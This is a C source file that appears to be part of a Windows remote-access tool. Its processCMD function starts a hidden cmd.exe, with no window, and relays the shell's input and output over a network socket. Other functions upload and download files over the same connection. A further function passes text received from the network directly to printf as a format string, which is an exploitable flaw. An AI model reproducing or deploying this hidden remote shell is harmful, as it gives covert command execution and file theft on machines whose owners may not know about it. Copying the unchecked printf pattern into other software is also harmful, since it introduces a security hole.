#include <stdio.h>
#include "EA_Socket.h"
#include <EA_Process.h>

void processCMD(int sckt)
{
	char * recv = NULL;
	CHAR chBuf[4500 + 1];
	DWORD dwRead, dwWritten;
	SECURITY_ATTRIBUTES saAttr;
	HANDLE hChildStd_IN_Rd = NULL, hChildStd_IN_Wr = NULL, hChildStd_OUT_Rd = NULL, hChildStd_OUT_Wr = NULL;

	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);

	if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
	{
		senderText(sckt, "_Error_");
		return;
	}

	if (!CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0))
	{
		senderText(sckt, "_Error_");
		return;
	}

	BOOL bSuccess = FALSE;
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdInput = hChildStd_IN_Rd;
	siStartInfo.hStdError = hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = hChildStd_OUT_Wr;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	bSuccess = CreateProcessA(TEXT("C:\\Windows\\System32\\cmd.exe"), NULL,
		NULL, NULL, TRUE,
		CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
		NULL, NULL, &siStartInfo, &piProcInfo
	);

	if (!bSuccess)
	{
		senderText(sckt, "_Error_");
		return;
	}
	else
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}

	for(;;)
	{
		Sleep(500); //TODO: pipe tam dolana kadar beklenmeli
		//TODO: pipe buf is bigger than 4101 again read, note: PeekNamedPipe
		bSuccess = ReadFile(hChildStd_OUT_Rd, chBuf, 4500, &dwRead, NULL);

		if(!bSuccess || dwRead == 0)
		{
			senderText(sckt, "_Error_");
			WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
			break;
		}

		chBuf[dwRead] = 0;
		senderText(sckt, chBuf);
		recv = recverText(sckt);

		if (recv == NULL)
		{
			senderText(sckt, "_Error_");
			WriteFile(hChildStd_IN_Wr, "exit\n", strlen("exit\n"), &dwWritten, NULL);
			break;
		}

		bSuccess = WriteFile(hChildStd_IN_Wr, recv, strlen(recv), &dwWritten, NULL);

		if (!bSuccess)
		{
			free(recv);
			senderText(sckt, "_Error_");
			break;
		}

		if (strcmp(recv, "exit\n") == 0)
		{
			senderText(sckt, "_Error_");
			break;
		}

		free(recv);
	}

	CloseHandle(hChildStd_IN_Wr);
	CloseHandle(hChildStd_OUT_Rd);
}

void processFileUpload(int sckt, char * path)
{
	senderFile(sckt, path);
}

void processFileDownload(int sckt, char * path)
{
	free(recverFile(sckt));
}

void processRecvSendText(int sckt)
{
	char * buffer;
	char input[300 + 1] = { 0 };

	while(1)
	{
		buffer = recverText(sckt);

		if (buffer == NULL)
		{
			break;
		}

		if(strcmp(buffer, "_Error_") == 0)
		{
			free(buffer);
			break;
		}

		printf(buffer);
		free(buffer);

		fgets(input, 300, stdin);

		senderText(sckt, input);
	}
}
